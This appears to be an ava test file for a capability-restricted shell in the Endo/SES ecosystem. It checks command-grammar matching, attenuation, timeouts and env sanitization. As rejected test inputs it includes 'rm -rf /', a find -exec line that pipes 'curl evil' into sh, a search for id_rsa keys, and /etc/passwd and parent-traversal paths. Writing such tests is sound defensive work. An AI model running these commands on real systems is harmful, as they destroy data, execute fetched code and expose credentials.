// @ts-check

// Establish a SES perimeter (provides the `harden` global).
// eslint-disable-next-line import/order
import '@endo/init/debug.js';

import test from 'ava';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';

import {
  matches,
  getInterfaceGuardPayload,
  getMethodGuardPayload,
} from '@endo/patterns';
import { makeHostSpawner } from '@endo/host-spawner';

import { makeShell } from '../src/shell.js';
import { ShellInterface } from '../src/interfaces.js';
import {
  formatShellCommandUsage,
  matchShellCommand,
  normalizeShellCommandGrammars,
} from '../src/command-grammar.js';

/**
 * A fully controllable in-memory {@link Spawner}.  Each spawn records the argv
 * and opts it was handed and returns a {@link ProcessLike} whose stdout / stderr
 * / exit are scripted by `plan`.  Nothing touches the OS, so grammar / argv /
 * env / output-cap / timeout behaviour is exercised deterministically.
 *
 * @param {(argv: string[], opts: object) => {
 *   stdout?: Uint8Array[],
 *   stderr?: Uint8Array[],
 *   code?: number | null,
 *   signal?: string | null,
 *   hang?: boolean,
 *   ignoreSigterm?: boolean,
 * }} plan
 */
const makeFakeSpawner = plan => {
  /** @type {{ argv: string[], opts: object }[]} */
  const calls = [];
  /** @type {string[]} */
  const killLog = [];
  /** @type {import('@endo/host-spawner').Spawner} */
  const spawner = async (argv, opts = {}) => {
    calls.push({ argv: [...argv], opts });
    const script = plan(argv, opts);
    const toStream = chunks =>
      chunks === undefined
        ? null
        : {
            async *[Symbol.asyncIterator]() {
              for (const c of chunks) yield c;
            },
          };
    const killed = {
      /** @type {(v: { code: number|null, signal: string|null }) => void} */
      resolve: () => {},
    };
    const exited = script.hang
      ? new Promise(resolve => {
          killed.resolve = resolve;
        })
      : Promise.resolve({
          code: script.code ?? 0,
          signal: script.signal ?? null,
        });
    return harden({
      pid: 1234,
      stdout: toStream(script.stdout),
      stderr: toStream(script.stderr),
      wait: () => exited,
      kill: async signal => {
        const killSignal = signal == null ? 'SIGTERM' : String(signal);
        killLog.push(killSignal);
        // A child that traps SIGTERM only dies on the uncatchable SIGKILL —
        // the shape the exo-shell timeout must escalate through.
        if (script.ignoreSigterm && killSignal !== 'SIGKILL') {
          return;
        }
        // A hanging process resolves its exit when killed.
        killed.resolve({ code: null, signal: killSignal });
      },
    });
  };
  return { spawner: harden(spawner), calls, killLog };
};

const bytes = s => new TextEncoder().encode(s);

/**
 * `echo <anything that is not an option token>...`
 *
 * @type {import('../src/types.js').ShellCommandGrammar}
 */
const echoGrammar = harden({
  program: 'echo',
  args: [{ kind: 'rest', name: 'words', type: 'string' }],
});

/**
 * `node -e <code>` — the only `node` form the base grant admits.
 *
 * @type {import('../src/types.js').ShellCommandGrammar}
 */
const nodeEvalGrammar = harden({
  program: 'node',
  args: [
    { kind: 'options', options: ['-e'] },
    { kind: 'slot', name: 'code', type: 'string' },
  ],
});

/** @type {import('../src/types.js').ShellPolicy} */
const basePolicy = harden({
  commands: [echoGrammar, nodeEvalGrammar],
  timeoutMs: 1000,
  maxOutputBytes: 1024,
  env: { CI: 'true' },
});

// --- command-grammar matching ------------------------------------------------

test('a rest element is rejected anywhere but the final top-level position', t => {
  t.throws(
    () =>
      normalizeShellCommandGrammars([
        {
          program: 'git',
          args: [
            {
              kind: 'group',
              elements: [{ kind: 'rest', name: 'inner', type: 'path' }],
            },
          ],
        },
      ]),
    { message: /rest element is only valid as the final top-level element/ },
  );
  t.throws(
    () =>
      normalizeShellCommandGrammars([
        {
          program: 'git',
          args: [
            { kind: 'rest', name: 'early', type: 'path' },
            { kind: 'literal', value: 'tail' },
          ],
        },
      ]),
    { message: /rest element is only valid as the final top-level element/ },
  );
});

test('matchShellCommand accepts and rejects per element kind', t => {
  const grammar = normalizeShellCommandGrammars([
    {
      program: 'git',
      args: [
        { kind: 'literal', value: 'log' },
        {
          kind: 'options',
          optional: true,
          repeat: true,
          options: ['--oneline', { prefix: '--max-count=', type: 'string' }],
        },
        {
          kind: 'group',
          optional: true,
          elements: [
            { kind: 'literal', value: '--' },
            { kind: 'slot', name: 'path', type: 'path' },
          ],
        },
      ],
    },
  ])[0];
  const ok = args => matchShellCommand(grammar, 'git', harden(args));
  t.true(ok(['log']));
  t.true(ok(['log', '--oneline']));
  t.true(ok(['log', '--max-count=5', '--oneline']));
  t.true(ok(['log', '--', 'src/index.js']));
  t.true(ok(['log', '--oneline', '--', 'src/index.js']));
  t.false(ok([]), 'the literal subcommand is required');
  t.false(ok(['status']), 'a different literal is rejected');
  t.false(ok(['log', '--force']), 'an option outside the union is rejected');
  t.false(ok(['log', '--']), 'a group matches only as a whole');
  t.false(ok(['log', '--', '/etc/passwd']), 'absolute path rejected');
  t.false(ok(['log', '--', '../secret']), 'parent traversal rejected');
  t.false(ok(['log', '--', 'a/../b']), 'embedded .. segment rejected');
  t.false(ok(['log', 'extra']), 'trailing unmatched tokens are rejected');
  t.false(
    matchShellCommand(grammar, 'gitx', harden(['log'])),
    'the program name must match exactly',
  );
});

test('a repeated group matches flag-value pairs and requires progress', t => {
  const grammar = normalizeShellCommandGrammars([
    {
      program: 'tar',
      args: [
        { kind: 'literal', value: '-tf' },
        { kind: 'slot', name: 'archive', type: 'path' },
        {
          kind: 'group',
          optional: true,
          repeat: true,
          elements: [
            { kind: 'literal', value: '--exclude' },
            { kind: 'slot', name: 'glob', type: 'string' },
          ],
        },
      ],
    },
  ])[0];
  const ok = args => matchShellCommand(grammar, 'tar', harden(args));
  t.true(ok(['-tf', 'out.tar']));
  t.true(ok(['-tf', 'out.tar', '--exclude', 'a', '--exclude', 'b']));
  t.false(ok(['-tf', 'out.tar', '--exclude']), 'a dangling flag is rejected');
  t.false(ok(['-tf', 'out.tar', 'a']), 'a bare value without its flag');
});

test('string slots cannot be occupied by option tokens or NUL-bearing strings', t => {
  const grammar = normalizeShellCommandGrammars([
    {
      program: 'grep',
      args: [
        { kind: 'literal', value: '--' },
        { kind: 'slot', name: 'pattern', type: 'string' },
        { kind: 'rest', name: 'paths', type: 'path' },
      ],
    },
  ])[0];
  t.true(matchShellCommand(grammar, 'grep', harden(['--', 'TODO', 'src'])));
  t.false(
    matchShellCommand(grammar, 'grep', harden(['--', '-rf'])),
    'a dash-leading token cannot occupy a free slot',
  );
  t.false(
    matchShellCommand(grammar, 'grep', harden(['--', 'TO\u0000DO'])),
    'NUL never matches',
  );
  t.false(
    matchShellCommand(grammar, 'grep', harden(['--', ''])),
    'the empty string never matches',
  );
});

test('formatShellCommandUsage renders a deterministic usage line', t => {
  const [grammar] = normalizeShellCommandGrammars([
    {
      program: 'grep',
      args: [
        {
          kind: 'options',
          optional: true,
          repeat: true,
          options: ['-r', '-n', { prefix: '--include=', type: 'string' }],
        },
        { kind: 'literal', value: '--' },
        { kind: 'slot', name: 'pattern', type: 'string' },
        { kind: 'rest', name: 'paths', type: 'path' },
      ],
    },
  ]);
  t.is(
    formatShellCommandUsage(grammar),
    'grep [-r | -n | --include=<string>]... -- <pattern> [<paths:path> ...]',
  );
});

test('normalization rejects malformed grammars up front', t => {
  t.throws(() => normalizeShellCommandGrammars([]), {
    message: /non-empty array/,
  });
  t.throws(
    () => normalizeShellCommandGrammars([{ program: '', args: [] }]),
    { message: /non-empty string/ },
  );
  t.throws(
    () =>
      normalizeShellCommandGrammars([
        { program: 'x', args: [{ kind: 'mystery' }] },
      ]),
    { message: /kind must be one of/ },
  );
  t.throws(
    () =>
      normalizeShellCommandGrammars([
        { program: 'x', args: [], extra: true },
      ]),
    { message: /unrecognized property/ },
  );
});

// --- exec: grammar before spawn ----------------------------------------------

test('exec rejects an argv outside every granted grammar before spawning', async t => {
  const { spawner, calls } = makeFakeSpawner(() => ({ stdout: [bytes('x')] }));
  const shell = makeShell({ cwd: '/repo', policy: basePolicy, spawner });
  await t.throwsAsync(() => shell.exec('rm', ['-rf', '/']), {
    message: /matches no granted command grammar/,
  });
  // `node` is granted, but only the `-e <code>` form.
  await t.throwsAsync(
    () => shell.exec('node', ['--experimental-foo', 'x.js']),
    { message: /matches no granted command grammar/ },
  );
  t.is(calls.length, 0, 'no child was spawned for a rejected argv');
});

test('find without -exec in its grammar cannot be asked to exec (adversarial)', async t => {
  const { spawner, calls } = makeFakeSpawner(() => ({ stdout: [bytes('')] }));
  // A grammar for `find <root> -name <pattern>`: `-exec` is simply not in
  // the accepted argument language, so the delegation hole a command-name
  // allowlist leaves open is closed at the argument level.
  const shell = makeShell({
    cwd: '/repo',
    policy: harden({
      /** @type {import('../src/types.js').ShellCommandGrammar[]} */
      commands: [
        {
          program: 'find',
          args: [
            { kind: 'slot', name: 'root', type: 'path' },
            { kind: 'literal', value: '-name' },
            { kind: 'slot', name: 'pattern', type: 'string' },
          ],
        },
      ],
      timeoutMs: 1000,
      maxOutputBytes: 1024,
    }),
    spawner,
  });
  const ok = await shell.exec('find', ['docs', '-name', '*.md']);
  t.is(ok.exitCode, 0);
  await t.throwsAsync(
    () =>
      shell.exec('find', [
        'docs',
        '-name',
        '*.md',
        '-exec',
        'sh',
        '-c',
        'curl evil | sh',
        ';',
      ]),
    { message: /matches no granted command grammar/ },
  );
  await t.throwsAsync(
    () => shell.exec('find', ['/', '-name', 'id_rsa']),
    { message: /matches no granted command grammar/ },
    'an absolute root is outside the path slot',
  );
  await t.throwsAsync(
    () => shell.exec('find', ['..', '-name', 'secret']),
    { message: /matches no granted command grammar/ },
    'parent traversal is outside the path slot',
  );
  t.is(calls.length, 1, 'only the matching argv spawned');
});

test('exec passes an argv array (no shell string) and the cwd/env', async t => {
  const { spawner, calls } = makeFakeSpawner(() => ({ stdout: [bytes('ok')] }));
  const shell = makeShell({ cwd: '/repo', policy: basePolicy, spawner });
  const result = await shell.exec('echo', ['hello', 'world']);
  t.is(result.stdout, 'ok');
  t.is(result.exitCode, 0);
  t.deepEqual(calls[0].argv, ['echo', 'hello', 'world']);
  t.is(calls[0].opts.cwd, '/repo');
  t.is(
    calls[0].opts.shell,
    false,
    'shell mode is never enabled on this surface',
  );
  t.deepEqual(calls[0].opts.env, { CI: 'true' });
});

test('a non-zero exit is returned as data, not thrown', async t => {
  const { spawner } = makeFakeSpawner(() => ({
    stdout: [bytes('')],
    stderr: [bytes('nope')],
    code: 3,
  }));
  const shell = makeShell({ cwd: '/repo', policy: basePolicy, spawner });
  const result = await shell.exec('node', ['-e', 'process.exit(3)']);
  t.is(result.exitCode, 3);
  t.is(result.stderr, 'nope');
  t.false(result.truncated);
});

test('stdout beyond maxOutputBytes is truncated and flagged', async t => {
  const { spawner } = makeFakeSpawner(() => ({
    stdout: [bytes('a'.repeat(50)), bytes('b'.repeat(50))],
  }));
  const shell = makeShell({
    cwd: '/repo',
    policy: harden({ ...basePolicy, maxOutputBytes: 10 }),
    spawner,
  });
  const result = await shell.exec('echo', ['big']);
  t.is(result.stdout.length, 10);
  t.is(result.stdout, 'a'.repeat(10));
  t.true(result.truncated);
});

test('a hanging process is killed at the timeout and reports the signal', async t => {
  const { spawner } = makeFakeSpawner(() => ({ hang: true }));
  const shell = makeShell({
    cwd: '/repo',
    policy: harden({ ...basePolicy, timeoutMs: 50 }),
    spawner,
  });
  const result = await shell.exec('node', ['-e', 'while(true){}']);
  t.is(result.exitCode, null);
  t.is(result.signal, 'SIGTERM');
});

test('a child that traps SIGTERM is escalated to SIGKILL, so exec cannot hang', async t => {
  // Model the panel's repro: a granted child that ignores SIGTERM (e.g.
  // `bash -c 'trap "" TERM; sleep 3600'`).  Without escalation, proc.wait()
  // would never settle and exec would hang forever; the timeout must force it
  // down with the uncatchable SIGKILL.
  const { spawner, killLog } = makeFakeSpawner(() => ({
    hang: true,
    ignoreSigterm: true,
  }));
  const shell = makeShell({
    cwd: '/repo',
    policy: harden({ ...basePolicy, timeoutMs: 20 }),
    spawner,
    killGraceMs: 20,
  });
  const result = await shell.exec('node', ['-e', 'while(true){}']);
  t.is(result.exitCode, null);
  t.is(result.signal, 'SIGKILL', 'the child was reaped by the escalated kill');
  t.deepEqual(
    killLog,
    ['SIGTERM', 'SIGKILL'],
    'SIGTERM was tried first, then escalated to SIGKILL',
  );
});

test('makeShell rejects a non-positive killGraceMs', t => {
  t.throws(
    () =>
      makeShell({
        cwd: '/repo',
        policy: basePolicy,
        spawner: harden(async () =>
          harden({
            pid: 1,
            wait: async () => ({ code: 0, signal: null }),
            kill: async () => {},
          }),
        ),
        killGraceMs: 0,
      }),
    { message: /killGraceMs must be a positive integer/ },
  );
});

test('a per-call timeout may only narrow the policy, never widen it', async t => {
  const { spawner } = makeFakeSpawner(() => ({ hang: true }));
  const shell = makeShell({
    cwd: '/repo',
    policy: harden({ ...basePolicy, timeoutMs: 40 }),
    spawner,
  });
  // A widening request (10_000) is ignored — the policy's 40ms still fires.
  const start = Date.now();
  const result = await shell.exec('node', ['-e', '1'], { timeoutMs: 10_000 });
  const elapsedMs = Date.now() - start;
  t.is(result.signal, 'SIGTERM');
  t.true(elapsedMs < 5000, 'the widening per-call timeout did not take effect');
});

// --- attenuation ---------------------------------------------------------------

test('attenuate narrows the accepted language; the parent still enforces its own', async t => {
  const { spawner, calls } = makeFakeSpawner(() => ({ stdout: [bytes('')] }));
  const shell = makeShell({ cwd: '/repo', policy: basePolicy, spawner });
  // Narrow `echo <words>...` down to exactly `echo ok`.
  const narrowed = await shell.attenuate(
    harden(
      /** @type {import('../src/types.js').ShellCommandGrammar[]} */ ([
        {
          program: 'echo',
          args: [{ kind: 'literal', value: 'ok' }],
        },
      ]),
    ),
  );
  const result = await narrowed.exec('echo', ['ok']);
  t.is(result.exitCode, 0);
  await t.throwsAsync(() => narrowed.exec('echo', ['other']), {
    message: /matches no granted command grammar/,
  });
  await t.throwsAsync(() => narrowed.exec('node', ['-e', '1']), {
    message: /matches no granted command grammar/,
  });
  t.is(calls.length, 1);
});

test('attenuate cannot widen: a grammar outside the parent language runs nothing', async t => {
  const { spawner, calls } = makeFakeSpawner(() => ({ stdout: [bytes('')] }));
  const shell = makeShell({ cwd: '/repo', policy: basePolicy, spawner });
  // The derived facet happily *holds* an `rm` grammar, but the parent's check
  // still runs on delegation, so nothing outside the root grant can spawn.
  const widened = await shell.attenuate(
    harden(
      /** @type {import('../src/types.js').ShellCommandGrammar[]} */ ([
        {
          program: 'rm',
          args: [{ kind: 'rest', name: 'paths', type: 'path' }],
        },
      ]),
    ),
  );
  await t.throwsAsync(() => widened.exec('rm', ['stray.txt']), {
    message: /matches no granted command grammar/,
  });
  t.is(calls.length, 0, 'the widening attempt never reached the spawner');
});

test('attenuation chains and timeoutMs only narrows along the chain', async t => {
  const { spawner } = makeFakeSpawner(() => ({ hang: true }));
  const shell = makeShell({
    cwd: '/repo',
    policy: harden({ ...basePolicy, timeoutMs: 10_000 }),
    spawner,
  });
  const once = await shell.attenuate(harden([echoGrammar]), {
    timeoutMs: 40,
  });
  // A grandchild asking for a wider timeout still gets the 40ms bound.
  const twice = await once.attenuate(harden([echoGrammar]), {
    timeoutMs: 9000,
  });
  const inspected = await twice.inspect();
  t.is(inspected.timeoutMs, 40);
  const start = Date.now();
  const result = await twice.exec('echo', ['hi']);
  t.is(result.signal, 'SIGTERM');
  t.true(Date.now() - start < 5000, 'the narrowed timeout bound the exec');
});

test('attenuate validates its grammars and rejects a non-positive timeout', async t => {
  const { spawner } = makeFakeSpawner(() => ({ stdout: [] }));
  const shell = makeShell({ cwd: '/repo', policy: basePolicy, spawner });
  await t.throwsAsync(() => shell.attenuate(harden([])), {
    message: /non-empty array/,
  });
  await t.throwsAsync(
    () => shell.attenuate(harden([echoGrammar]), harden({ timeoutMs: 0 })),
    { message: /timeoutMs must be a positive integer/ },
  );
});

// --- inspect -------------------------------------------------------------------

test('inspect reveals the grammars and usage but no host path (cwd/env/searchPath)', async t => {
  const { spawner } = makeFakeSpawner(() => ({ stdout: [] }));
  const shell = makeShell({
    cwd: '/very/secret/host/path',
    policy: harden({
      /** @type {import('../src/types.js').ShellCommandGrammar[]} */
      commands: [echoGrammar],
      timeoutMs: 1000,
      maxOutputBytes: 2048,
      env: { SECRET_TOKEN: 'do-not-leak' },
      searchPath: '/home/user/.local/bin:/usr/bin',
    }),
    spawner,
  });
  const revealed = await shell.inspect();
  t.deepEqual(revealed, {
    commands: [echoGrammar],
    usage: ['echo [<words> ...]'],
    timeoutMs: 1000,
    maxOutputBytes: 2048,
  });
  const serialized = JSON.stringify(revealed);
  t.false(serialized.includes('secret'), 'cwd path did not leak');
  t.false(serialized.includes('do-not-leak'), 'env value did not leak');
  t.false(serialized.includes('.local'), 'searchPath did not leak');
});

test("inspect's returns-guard is a closed record: a stray host-path field is rejected", t => {
  // The guard is the defense-in-depth net that stops a regressed inspect()
  // from leaking cwd / env / searchPath.  It only holds if ShellPolicyShape is
  // a genuinely *closed* record — M.splitRecord is open by default, so this
  // pins that the record was closed.  Reverting to the open shape makes the
  // final assertion fail (an open record would accept the extra field).
  const { methodGuards } = getInterfaceGuardPayload(
    /** @type {any} */ (ShellInterface),
  );
  const { returnGuard } = getMethodGuardPayload(methodGuards.inspect);
  const bounds = harden({
    commands: [echoGrammar],
    usage: ['echo [<words> ...]'],
    timeoutMs: 1000,
    maxOutputBytes: 2048,
  });
  t.true(matches(bounds, returnGuard), 'the four named fields match');
  t.false(
    matches(harden({ ...bounds, cwd: '/secret/host/path' }), returnGuard),
    'a stray host-path field is rejected by the closed record',
  );
});

test('a read-only mount is refused: a shell that cannot mutate is not a shell', t => {
  const { spawner } = makeFakeSpawner(() => ({ stdout: [] }));
  t.throws(
    () =>
      makeShell({ cwd: '/repo', policy: basePolicy, spawner, readOnly: true }),
    { message: /read-only mount/ },
  );
});

// --- integration: real host spawner proves env sanitization end-to-end ------

test('host engine: the child sees only the policy env, never the host process env', async t => {
  const root = await fs.promises.mkdtemp(path.join(os.tmpdir(), 'exo-shell-'));
  t.teardown(() => fs.promises.rm(root, { recursive: true, force: true }));

  // A secret in the *host* process env must not reach the child.
  process.env.EXO_SHELL_HOST_SECRET = 'leaked';
  t.teardown(() => {
    delete process.env.EXO_SHELL_HOST_SECRET;
  });

  const searchPath = process.env.PATH || '/usr/bin:/bin';
  const spawner = makeHostSpawner({
    searchPath,
    defaultEnv: { PATH: searchPath, LC_ALL: 'C' },
  });
  const shell = makeShell({
    cwd: root,
    policy: harden({
      /** @type {import('../src/types.js').ShellCommandGrammar[]} */
      commands: [
        {
          program: 'printenv',
          args: [{ kind: 'slot', name: 'variable', type: 'string' }],
        },
        { program: 'pwd', args: [] },
      ],
      timeoutMs: 10_000,
      maxOutputBytes: 65_536,
      env: { PASSED_THROUGH: 'yes' },
      searchPath,
    }),
    spawner,
  });

  // The passlisted var is present.
  const passed = await shell.exec('printenv', ['PASSED_THROUGH']);
  t.is(passed.stdout.trim(), 'yes');
  t.is(passed.exitCode, 0);

  // The host secret is absent → printenv exits non-zero with empty stdout.
  const secret = await shell.exec('printenv', ['EXO_SHELL_HOST_SECRET']);
  t.is(secret.stdout.trim(), '');
  t.not(secret.exitCode, 0);

  // cwd is the mount directory.
  const cwd = await shell.exec('pwd', []);
  t.is(cwd.stdout.trim(), fs.realpathSync(root));
});
